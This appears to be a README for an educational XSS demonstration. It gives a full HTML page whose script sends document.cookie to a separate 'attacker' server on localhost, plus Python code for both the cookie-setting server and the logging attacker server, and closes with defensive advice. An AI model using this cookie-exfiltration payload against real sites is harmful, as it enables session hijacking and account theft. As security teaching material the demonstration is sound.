
# XSS Vulnerability Demonstration

This repository contains a simple demonstration of how an XSS (Cross-Site Scripting) vulnerability can be exploited to capture cookies from a user's browser. It sets up a basic HTTP server that serves an HTML page containing an XSS script, as well as an attacker server that logs the incoming requests to capture the cookie data.

## Prerequisites

- Python 3.x installed on your system
- Basic understanding of HTTP servers and XSS vulnerabilities

## Installation

1. **Clone the Repository**

   ```bash
   git clone https://github.com/your-username/xss-vulnerability-demo.git
   cd xss-vulnerability-demo
   ```

2. **Create the HTML File**

   Ensure the HTML file named `index.html` is present in the same directory as the server scripts. This file contains the XSS script to send cookies to the attacker's server.

   ```html
   <!DOCTYPE html>
   <html lang="en">
   <head>
       <meta charset="UTF-8">
       <meta name="viewport" content="width=device-width, initial-scale=1.0">
       <title>XSS Example</title>
   </head>
   <body>
       <h1>Welcome to the Vulnerable Page</h1>
       <p>This page contains an XSS vulnerability example.</p>
       <script>
           // Log the cookies to the console for verification
           console.log("Cookies:", document.cookie);

           // XSS script that sends cookies to the attacker's server
           var img = new Image();
           img.src = "http://localhost:9000/log?cookie=" + encodeURIComponent(document.cookie);
       </script>
   </body>
   </html>
   ```

## Usage

### Step 1: Run the Main HTTP Server

This server will serve the HTML page and set a unique cookie for each browser session.

1. **Create `server.py`**

   ```python
   from http.server import HTTPServer, SimpleHTTPRequestHandler
   import http.cookies
   import uuid

   class CookieHandler(SimpleHTTPRequestHandler):
       def do_GET(self):
           # Generate a unique session ID for each browser that loads the page
           unique_id = str(uuid.uuid4())  # Create a UUID for the session

           # Create a cookie with the unique session ID
           cookie = http.cookies.SimpleCookie()
           cookie["session_id"] = unique_id
           cookie["session_id"]["path"] = "/"  # Ensure the cookie is accessible site-wide

           # Send the response header with the cookie
           self.send_response(200)
           self.send_header("Content-type", "text/html")
           self.send_header("Set-Cookie", cookie.output(header='', sep=''))
           self.end_headers()

           # Read and send the HTML content
           with open("index.html", "rb") as file:  # Ensure this matches your HTML file name
               self.wfile.write(file.read())

   # Configure and run the server
   PORT = 8000
   server_address = ('', PORT)
   httpd = HTTPServer(server_address, CookieHandler)
   print(f"Serving on port {PORT}")
   httpd.serve_forever()
   ```

2. **Run the Server**

   Open a terminal and run the following command to start the server:

   ```bash
   python server.py
   ```

### Step 2: Run the Attacker Server

This server will log the incoming requests and capture the cookies sent by the XSS script.

1. **Create `attacker_server.py`**

   ```python
   from http.server import HTTPServer, BaseHTTPRequestHandler

   class LoggingHandler(BaseHTTPRequestHandler):
       def do_GET(self):
           # Log the request path, including the cookie data
           print(f"Received request: {self.path}")

           # Send a 200 OK response
           self.send_response(200)
           self.end_headers()

   # Configure and run the logging server
   ATTACKER_PORT = 9000
   server_address = ('', ATTACKER_PORT)
   httpd = HTTPServer(server_address, LoggingHandler)
   print(f"Attacker server running on port {ATTACKER_PORT}")
   httpd.serve_forever()
   ```

2. **Run the Attacker Server**

   Open another terminal and run the following command to start the attacker server:

   ```bash
   python attacker_server.py
   ```

### Step 3: Access the Vulnerable Page

1. Open your web browser and navigate to `http://localhost:8000`.

2. Open the developer console in your browser (usually `F12` or right-click and select "Inspect"), and go to the "Console" tab to verify the cookies.

3. Check the terminal where the attacker server is running to see the logged request, including the cookie data.

### Important Note

This demonstration is intended for educational purposes only. It shows how XSS vulnerabilities can be exploited to capture cookies. Always follow best practices to secure your web applications against such vulnerabilities:

- **Validate and Sanitize Inputs**: Ensure all user inputs are properly validated and sanitized.
- **Use HTTPOnly and Secure Flags**: Set these flags on cookies to prevent JavaScript access and ensure cookies are transmitted only over HTTPS.
- **Implement Content Security Policy (CSP)**: Use CSP headers to prevent inline scripts and control resource loading.

### License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

---

By following these instructions, you should be able to set up a local demonstration of how XSS vulnerabilities can be used to capture cookies. If you have any questions or issues, feel free to open an issue in the repository.
